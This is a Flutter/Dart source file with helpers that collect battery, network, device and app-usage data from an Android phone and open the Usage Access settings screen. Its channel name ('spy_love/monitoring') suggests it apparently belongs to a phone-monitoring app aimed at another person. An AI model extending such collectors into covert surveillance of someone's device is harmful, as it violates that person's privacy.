import 'package:flutter/services.dart';

/// Android MethodChannel helpers for battery, network, device_info, and app_usage.
///
/// Uses the same channel as [NotificationBridge] / [SimBridge]
/// (`org.hmg.spy_love/monitoring`). Network is collected natively (not via
/// connectivity_plus, which is banned by project rules).
class CollectorsBridge {
  CollectorsBridge._();

  static const _channel = MethodChannel('org.hmg.spy_love/monitoring');

  static Future<Map<String, dynamic>?> getBatteryStatus() async {
    try {
      final result = await _channel.invokeMethod<Map<dynamic, dynamic>>('getBatteryStatus');
      if (result == null) return null;
      return Map<String, dynamic>.from(result);
    } on PlatformException {
      return null;
    }
  }

  static Future<Map<String, dynamic>?> getNetworkStatus() async {
    try {
      final result = await _channel.invokeMethod<Map<dynamic, dynamic>>('getNetworkStatus');
      if (result == null) return null;
      return Map<String, dynamic>.from(result);
    } on PlatformException {
      return null;
    }
  }

  static Future<Map<String, dynamic>?> getDeviceInfo() async {
    try {
      final result = await _channel.invokeMethod<Map<dynamic, dynamic>>('getDeviceInfo');
      if (result == null) return null;
      return Map<String, dynamic>.from(result);
    } on PlatformException {
      return null;
    }
  }

  /// Recent app usage via UsageStatsManager. Requires PACKAGE_USAGE_STATS
  /// (Usage Access) granted in system settings.
  static Future<List<Map<String, dynamic>>> getAppUsage({
    int? sinceMs,
    int limit = 20,
  }) async {
    try {
      final result = await _channel.invokeMethod<List<dynamic>>(
        'getAppUsage',
        {
          'sinceMs': sinceMs ?? DateTime.now().subtract(const Duration(hours: 24)).millisecondsSinceEpoch,
          'limit': limit,
        },
      );
      if (result == null) return [];
      return result
          .map((item) => Map<String, dynamic>.from(item as Map))
          .toList();
    } on PlatformException {
      return [];
    }
  }

  static Future<bool> isUsageAccessEnabled() async {
    try {
      final enabled = await _channel.invokeMethod<bool>('isUsageAccessEnabled');
      return enabled ?? false;
    } on PlatformException {
      return false;
    }
  }

  /// Opens Settings → Apps → Special app access → Usage access (same pattern as
  /// notification listener settings).
  static Future<void> openUsageAccessSettings() async {
    try {
      await _channel.invokeMethod<void>('openUsageAccessSettings');
    } on PlatformException {
      // ignored
    }
  }
}
